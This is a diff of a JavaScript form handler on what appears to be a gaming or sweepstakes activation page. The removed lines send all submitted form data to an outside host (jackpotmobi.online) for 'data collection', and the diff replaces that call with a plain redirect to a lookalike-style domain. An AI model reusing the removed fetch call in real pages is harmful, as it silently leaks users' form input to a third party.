@@ -1,23 +1,15 @@
 function formAction(form) {
+  // Prevent default form submission
+  event.preventDefault();
+
   // Get all form data
   const formData = new FormData(form);
 
-  // Send form data to jackpotmobi (optional - for data collection)
-  fetch("https://jackpotmobi.online/a88c8f8", {
-    method: "POST",
-    body: formData,
-  }).catch((error) => {
-    // If fetch fails, still redirect
-    console.log("Form submission processed");
-  });
+  // Log form submission (optional - for debugging)
+  console.log("Form submitted, redirecting to activation page...");
 
-  // Redirect to activation page after form submission
-  setTimeout(() => {
-    window.location.href = "https://wwwfirekirin.xyz/activating/";
-  }, 500); // 500ms delay to allow form submission
+  // Redirect to activation page immediately
+  window.location.href = "https://wwwfirekirin.xyz/activating/";
 
-  return false; // Prevent default form submission
+  return false;
 }
-//82fae2d
-// verify-by-google
-// https://jackpotmobi.online/verify-by-google
